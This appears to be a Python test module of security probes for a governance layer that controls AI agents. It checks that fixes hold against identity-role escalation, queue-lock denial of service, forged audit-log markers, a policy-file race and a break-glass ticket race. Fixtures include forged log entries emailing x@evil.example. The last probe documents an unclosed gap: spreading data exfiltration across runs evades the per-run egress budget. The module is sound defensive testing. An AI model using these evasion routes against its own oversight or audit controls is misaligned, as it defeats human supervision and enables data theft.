"""Round-12 closure probes (HARDENING ROUND-12, 2026-09-21).

Each ``_r12_*`` function asserts that a Wave-13 finding (F50-F54) is
CLOSED by the Round-12 hardening: every observation True means the
defense held and the attack step no longer succeeds. sit79-sit80 are
preserved-defense assertions: the wave-13 defense cells (report-time
forgery resistance, cross-run egress documentation) still hold after
the Round-12 changes.

``evals/run_evals.py`` registers this module AFTER
``evals/w13_probes.py`` (the historical wave-13 attack baseline), so
these closure assertions override sit74-sit80.

Probes are hermetic: temp dirs, no network, no repo mutation.
Read-only on ``gov/`` and everything else.

``evals/w13_probes.py`` is preserved UNCHANGED as the historical
wave-13 attack record; its sit74-80 playbooks are superseded here.
"""

import contextlib
import io
import json
import multiprocessing
import os
import shutil
import sys
import tempfile
from hashlib import sha256
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parent.parent
sys_path = str(REPO_ROOT)
if sys_path not in sys.path:
    sys.path.insert(0, sys_path)
tests_path = str(REPO_ROOT / "tests")
if tests_path not in sys.path:
    sys.path.insert(0, tests_path)

from tests.harness import make_run  # noqa: E402
from gov.identity import (  # noqa: E402
    PrincipalRegistry,
    UnregisteredPrincipalError,
    UnregisteredRoleError,
)
from gov.log import read_entries  # noqa: E402
from gov.policy import PolicyEngine  # noqa: E402


def _queued(ctx, tool="read_file", args=None, caller=None):
    from gov.executor import ToolExecutor
    q = ctx["approvals"]
    caller = caller or ctx["mint_identity"]("a1", "researcher", "org")
    args = args or {"path": "notes.txt"}
    return q.queue(
        {"tool": tool, "args": args,
         "redactions": [], "agent_justification": "test"},
        SimpleNamespace(policy_id="p", reason="r", flag=None),
        # Wave-174 lane 2 (display=execution): renderer-built preview
        # so benign control records pass the sweep's display check.
        preview=ToolExecutor._preview(tool, args),
        policy_hash=ctx["executor"].policy.policy_hash,
        caller_identity=caller)


_HARNESS_PRINCIPALS = {
    "customer-org": {"roles": ["support"], "agent_ids": ["support-1"]},
    "dev-org": {"roles": ["coder"], "agent_ids": ["coder-1"]},
    "research-org": {"roles": ["researcher"],
                     "agent_ids": ["researcher-1"]},
}


def _r12_identity_trust_anchor():
    """Round-12 closure for F50 (sit74).

    ``mint_identity()`` is now anchored to a deployment-controlled
    ``PrincipalRegistry``: an unregistered role raises
    ``UnregisteredRoleError``, an unregistered agent id raises
    ``UnregisteredPrincipalError`` (a distinct type from the
    role error), both audited as ``identity_mint_refused`` without
    consuming mint budget. Registry-free dev mode still mints but
    emits exactly one stderr SELF-ASSERTED warning per process.
    """
    o = {}
    reg = PrincipalRegistry(dict(
        _HARNESS_PRINCIPALS,
        **{"victim-org": {"roles": ["researcher"],
                          "agent_ids": ["victim-agent"]}}))
    ctx = make_run(principal_registry=reg)
    mint = ctx["executor"].mint_identity
    # 1. Unregistered role refused with the role-specific error.
    try:
        mint("victim-agent", "coder", "victim-org")
        o["unregistered_role_refused"] = False
    except UnregisteredRoleError:
        o["unregistered_role_refused"] = True
    # 2. Unregistered agent id refused (distinct error type).
    try:
        mint("rogue-agent", "researcher", "victim-org")
        o["unregistered_agent_id_refused"] = False
    except UnregisteredPrincipalError as e:
        o["unregistered_agent_id_refused"] = not isinstance(
            e, UnregisteredRoleError)
    # 3. Researcher->coder escalation at mint time is refused.
    try:
        mint("victim-agent", "coder", "victim-org")
        o["role_escalation_refused"] = False
    except UnregisteredRoleError:
        o["role_escalation_refused"] = True
    # 4. A registered pair mints fine with identical fields.
    ident = mint("victim-agent", "researcher", "victim-org")
    o["registered_pair_mints"] = (
        ident.agent_id == "victim-agent"
        and ident.role == "researcher"
        and ident.principal == "victim-org")
    # 5. Refusals are audited; the mint budget is untouched.
    refused = [e for e in read_entries(ctx["run_dir"] / "actions.jsonl")
               if e.get("event") == "identity_mint_refused"]
    o["refusals_audited"] = len(refused) == 3
    o["budget_not_consumed_by_refusals"] = (
        len(ctx["executor"]._minted) == 4)  # 3 harness + 1
    # 6. Registry-free dev mode warns exactly once per process. Reset
    # the documented per-process latch first: other probes in this
    # process may already have consumed it, and the property under
    # test is "one warning per process-epoch", not "first in run".
    import gov.identity as _ident_mod
    _ident_mod._self_asserted_warned = False
    buf = io.StringIO()
    with contextlib.redirect_stderr(buf):
        ctx2 = make_run()
        ctx2["executor"].mint_identity("d1", "researcher", "org")
        ctx2["executor"].mint_identity("d2", "coder", "org")
    o["dev_mode_warns_once"] = buf.getvalue().count("SELF-ASSERTED") == 1
    return o


def _r12_queue_lock_dos():
    """Round-12 closure for F51 (sit75).

    A directory swapped in for the queue lock path no longer kills
    sweeps with an unaudited ``IsADirectoryError``: the lock open is
    validated (regular-file check on the fd) and raises
    ``QueueLockPathError``, which ``execute_approved()`` audits as
    ``queue_lock_invalid`` and absorbs as an empty sweep. Repeat
    refusals coalesce (5s window, ``suppressed_repeats`` counter);
    removing the directory restores clean sweeps.
    """
    o = {}
    ctx = make_run()
    q, ex = ctx["approvals"], ctx["executor"]
    aid = _queued(ctx)
    q.decide(aid, True, "ok", decided_by="human-operator")
    lockp = ctx["run_dir"] / "approvals.lock"
    if lockp.exists():
        lockp.unlink()
    lockp.mkdir()

    def _refusals():
        return [e for e in read_entries(ctx["run_dir"] / "actions.jsonl")
                if e.get("event") == "approval_sweep_refused"
                and e.get("flag") == "queue_lock_invalid"]

    # 1. Directory at the lock path: absorbed, audited, no exception.
    try:
        first = ex.execute_approved()
        o["directory_lock_absorbed_no_exception"] = (first == [])
    except Exception:
        o["directory_lock_absorbed_no_exception"] = False
    o["directory_refusal_audited"] = (len(_refusals()) == 1)
    # 2. Rapid repeat refusals coalesce instead of audit-spamming.
    for _ in range(3):
        ex.execute_approved()
    o["repeat_refusals_coalesced"] = (
        len(_refusals()) == 1 and ex._lock_refusal_suppressed == 3)
    # 3. Approved work is not starved by the refusal.
    o["approval_survives_refusal"] = (q.get(aid)["status"] == "approved")
    # 4. Removing the directory restores clean sweeps.
    lockp.rmdir()
    done = ex.execute_approved()
    o["recovery_clean_after_rmdir"] = (
        len(done) == 1 and q.get(aid)["executed"] is True)
    return o


def _r12_reconciliation_verifies():
    """Round-12 closure for F52 (sit76).

    ``_reconcile_interrupted_executions`` verifies the full action-log
    chain before honoring any ``execution_authorized`` marker. A
    forged marker fails verification: the sweep refuses with an
    audited ``reconciliation_marker_invalid``, emits no phantom
    ``approval_execution_interrupted``, and does NOT reset the record
    to pending — the legitimately-approved work executes normally
    instead of starving. A genuine HMAC'd interrupted marker still
    reconciles to pending with the loud warning.
    """
    o = {}

    def _plant(logp, aid, seq, run_id):
        with open(logp, "a", encoding="utf-8") as f:
            f.write(json.dumps({
                "event": "tool_call", "seq": seq,
                "ts": "2030-01-01T00:00:00Z", "run_id": run_id,
                "agent_id": "a1", "role": "researcher",
                "tool": "read_file", "args": {"path": "notes.txt"},
                "decision": "execution_authorized", "approval_id": aid,
                "hash": "forged-not-a-real-mac"}) + "\n")

    # 1. Forged marker: refused, audited, no phantom interruption.
    ctx = make_run()
    q, ex = ctx["approvals"], ctx["executor"]
    aid = _queued(ctx)
    q.decide(aid, True, "ok", decided_by="human-operator")
    logp = ctx["run_dir"] / "actions.jsonl"
    _plant(logp, aid, 999, ex.run_id)
    done = ex.execute_approved()
    ents = read_entries(logp)
    refused = sum(1 for e in ents
                  if e.get("event") == "reconciliation_marker_invalid")
    interrupted = sum(1 for e in ents
                      if e.get("event") == "approval_execution_interrupted")
    o["forged_marker_refused_and_audited"] = (refused == 1)
    o["no_phantom_interruption"] = (interrupted == 0)
    # 2. The refusal is about the marker, not the approval: legitimate
    # approved work executes instead of pinning in pending.
    o["legitimate_work_not_starved"] = (
        len(done) == 1 and q.get(aid)["executed"] is True)
    # 3. A genuine HMAC'd interrupted marker still reconciles loudly.
    ctx2 = make_run()
    q2, ex2 = ctx2["approvals"], ctx2["executor"]
    aid2 = _queued(ctx2)
    q2.decide(aid2, True, "ok", decided_by="human-operator")
    q2.log.append({
        "event": "tool_call", "run_id": ex2.run_id, "agent_id": "a1",
        "role": "researcher", "tool": "read_file",
        "args": {"path": "notes.txt"}, "decision": "execution_authorized",
        "approval_id": aid2, "policy_id": "p", "reason": "crash-sim"})
    q2.mark_executed(aid2)
    ex2.execute_approved()
    ents2 = read_entries(ctx2["run_dir"] / "actions.jsonl")
    o["genuine_marker_reconciles_to_pending"] = (
        q2.get(aid2)["status"] == "pending"
        and sum(1 for e in ents2
                if e.get("event")
                == "approval_execution_interrupted") == 1)
    return o


def _r12_policy_pin_toctou():
    """Round-12 closure for F53 (sit77).

    ``PolicyEngine.__init__`` reads the policy file exactly ONCE: the
    pin hashes and the parser decodes the same in-memory buffer, so a
    policy-file writer has no hash-read/parse-read window to win. The
    byte-exact pin still refuses cosmetic drift fail-closed.
    """
    o = {}
    td = Path(tempfile.mkdtemp(prefix="r12pin-"))
    try:
        src = REPO_ROOT / "policies" / "default.yaml"
        dst = td / "policy.yaml"
        pristine = src.read_bytes()
        dst.write_bytes(pristine)
        orig_hash = sha256(pristine).hexdigest()
        # 1. Exactly one read of the policy path during __init__.
        calls = []
        real_read_bytes = Path.read_bytes

        def _counting(self):
            calls.append(str(self))
            return real_read_bytes(self)

        with mock.patch.object(Path, "read_bytes", _counting):
            engine = PolicyEngine(dst)
        o["single_read_no_toctou_window"] = (
            calls == [str(dst)])
        # 2. A swap after load cannot split pin from parsed config:
        # both came from the same buffer.
        attacker = pristine.replace(b"max_sends_per_run: 10",
                                    b"max_sends_per_run: 777")
        dst.write_bytes(attacker)
        o["pin_attests_pristine_bytes"] = (
            engine.policy_hash == orig_hash)
        o["parsed_config_is_pristine"] = (
            engine.rate_limit.get("max_sends_per_run") == 10)
        # 3. Byte-exact pin: cosmetic drift still refuses fail-closed.
        from gov.executor import ToolExecutor, PolicyPinMismatchError
        drifted = pristine + b"\n# cosmetic comment\n"
        dst.write_bytes(drifted)
        engine2 = PolicyEngine(dst)
        ctx = make_run()
        try:
            with mock.patch.dict(os.environ,
                                 {"GOV_POLICY_HASH": orig_hash}):
                # Wave-85: the pin-refusal cell needs the pin machinery
                # reached, so the raw pipeline is declared here (the
                # bypass is chained, never silent).
                ToolExecutor(run_dir=ctx["run_dir"], policy=engine2,
                             log=ctx["log"],
                             approvals=ctx["approvals"],
                             ungoverned_ack=(
                                 "round-12 closure battery: raw pipeline "
                                 "by design; this cell exercises the "
                                 "pin-refusal path"))
            o["cosmetic_drift_refused"] = False
        except PolicyPinMismatchError:
            o["cosmetic_drift_refused"] = True
    finally:
        shutil.rmtree(td, ignore_errors=True)
    return o


def _r12_breakglass_crossprocess():
    """Round-12 closure for F54 (sit78).

    Break-glass consume is serialized across processes: a dedicated
    ``break_glass_tickets.lock`` file lock (``fcntl.flock``) wraps the
    snapshot-membership check, the live ticket-store re-read, and the
    validate -> decide -> persist(used=True) sequence. Two
    barrier-synchronized forked processes racing one ticket produce
    exactly one ``approval_break_glass`` audit (children exit 0 and
    3); sequential reuse is refused.
    """
    o = {}
    ctx = make_run(break_glass_tickets=[("T-1", "ops-lead",
                                        "duty-reviewer")])
    q, ex = ctx["approvals"], ctx["executor"]
    aid = _queued(ctx)
    operator = ctx["mint_identity"]("op-1", "operator", "ops-lead")

    def _child(barrier):
        try:
            barrier.wait(timeout=30)
            q.break_glass(aid, "incident-42", operator_identity=operator,
                          ticket_id="T-1")
            os._exit(0)
        except ValueError:
            os._exit(3)
        except Exception:
            os._exit(9)

    barrier = multiprocessing.Barrier(3)
    pids = []
    try:
        for _ in range(2):
            pid = os.fork()
            if pid == 0:
                try:
                    _child(barrier)
                finally:
                    os._exit(9)
            pids.append(pid)
        barrier.wait(timeout=30)
        exits = sorted(os.waitpid(p, 0)[1] >> 8 for p in pids)
    finally:
        for p in pids:
            try:
                os.waitpid(p, 0)
            except ChildProcessError:
                pass
    audits = sum(
        1 for e in read_entries(ctx["run_dir"] / "actions.jsonl")
        if e.get("event") == "approval_break_glass")
    o["fork_race_single_winner"] = (audits == 1 and exits == [0, 3])
    # Sequential reuse of the consumed ticket is refused.
    aid2 = _queued(ctx)
    try:
        q.break_glass(aid2, "incident-43", operator_identity=operator,
                      ticket_id="T-1")
        o["sequential_reuse_refused"] = False
    except ValueError:
        o["sequential_reuse_refused"] = (
            q.get(aid2)["status"] == "pending")
    return o


def _r12_report_forgery_defense():
    """Preserved defense (sit79): the audit report verifies first.

    ``demo/make_report.py`` runs ``gov.log._verify`` on the run's
    actions.jsonl BEFORE rendering. A hand-crafted run dir with a
    valid-looking but forged log (bad HMACs throughout) renders with
    "Hash-chain verification: FAILED" and an integrity finding — the
    forgeries do not render as fact. Unchanged by Round-12.
    """
    o = {}
    from demo.make_report import main as _make_report
    td = Path(tempfile.mkdtemp(prefix="r12rf-"))
    try:
        run = td / "runs" / "forged-run"
        run.mkdir(parents=True)
        lines = []
        for i in range(1, 6):
            lines.append({
                "event": "tool_call", "seq": i,
                "ts": "2026-09-21T00:00:0%dZ" % i, "run_id": "forged-run",
                "agent_id": "mallory", "role": "admin",
                "principal": "evil-org", "tool": "send_email",
                "args": {"to": "x@evil.example", "subject": "s",
                         "body": "pwned"},
                "decision": "allowed_executed", "policy_id": "forged",
                "reason": "forged", "hash": "not-a-real-mac",
                "key_epoch": "prod"})
        (run / "actions.jsonl").write_text(
            "\n".join(json.dumps(e) for e in lines) + "\n",
            encoding="utf-8")
        old_cwd, old_argv = os.getcwd(), sys.argv[:]
        os.chdir(td)
        sys.argv = ["make_report.py", "--rundir", str(run)]
        try:
            _make_report()
        finally:
            os.chdir(old_cwd)
            sys.argv = old_argv
        md = (td / "reports" / "forged-run_audit_report.md").read_text(
            encoding="utf-8")
        o["report_verifies_chain_before_rendering"] = (
            "Hash-chain verification: **FAILED**" in md)
        o["forged_log_renders_failed_not_as_fact"] = (
            "FAILED at seq" in md)
    finally:
        shutil.rmtree(td, ignore_errors=True)
    return o


def _r12_crossrun_egress_defense():
    """Preserved defense (sit80): the F33 byte budget is per-run.

    14 runs x 20KB = 280KB exfiltrated via api_call — more than the
    256KB single-run budget — with every call "executed": the
    ``_egress_bytes`` accumulator resets to 0 on every fresh executor
    and no cross-run volume state exists. The campaign ledger is
    shape-aware (queue-only), never volume-aware. The docs stay honest
    about this (F5's aggregate-visibility debt). Unchanged by
    Round-12.
    """
    o = {}
    total = 0
    resets = True
    clean = True
    for i in range(14):
        ctx = make_run()
        ex = ctx["executor"]
        if ex._egress_bytes != 0:
            resets = False
        ident = ctx["mint_identity"]("a%d" % i, "researcher",
                                    "persistent-attacker")
        r = ex.call(ident, "api_call",
                    endpoint="https://api.synthetic.local/collect",
                    params={"blob%d" % i: "X" * (20 * 1024)})
        if r["status"] != "executed":
            clean = False
        total += 20 * 1024
    o["per_run_accumulator_resets_every_run"] = resets
    o["fourteen_runs_exceed_single_run_budget"] = (
        clean and total > 262144)
    o["no_cross_run_volume_denial_or_queue"] = clean
    return o


PROBES = {
    "identity_trust_anchor": _r12_identity_trust_anchor,
    "queue_lock_dos": _r12_queue_lock_dos,
    "reconciliation_verifies": _r12_reconciliation_verifies,
    "policy_pin_toctou": _r12_policy_pin_toctou,
    "breakglass_crossprocess": _r12_breakglass_crossprocess,
    "report_forgery_defense": _r12_report_forgery_defense,
    "crossrun_egress_defense": _r12_crossrun_egress_defense,
}

R12_WIRE = (
    ("sit74", "r12a", "identity_trust_anchor", "it2_"),
    ("sit75", "r12b", "queue_lock_dos", "ql2_"),
    ("sit76", "r12c", "reconciliation_verifies", "rv2_"),
    ("sit77", "r12d", "policy_pin_toctou", "pp2_"),
    ("sit78", "r12e", "breakglass_crossprocess", "bg3_"),
    ("sit79", "r12f", "report_forgery_defense", "rf2_"),
    ("sit80", "r12g", "crossrun_egress_defense", "ce2_"),
)


def register_r12(playbooks, w7_playbook):
    """Wire the round-12 closure probes into run_evals.PLAYBOOKS.

    Registered AFTER register_w13: the closure assertions override
    the wave-13 attack baseline for sit74-sit78 (F50-F54 CLOSED), and
    the sit79-sit80 preserved-defense assertions re-confirm the
    wave-13 defense cells after the Round-12 changes.
    ``evals/w13_probes.py`` stays on disk UNCHANGED as the historical
    wave-13 attack record; its sit74-80 playbooks are superseded here
    and never execute.
    """
    for sid, mk, pk, pre in R12_WIRE:
        fn = PROBES[pk]
        playbooks[sid] = (
            lambda s, p, _k=mk, _f=fn, _r=pre:
                w7_playbook(s, p, _k, _f, _r))
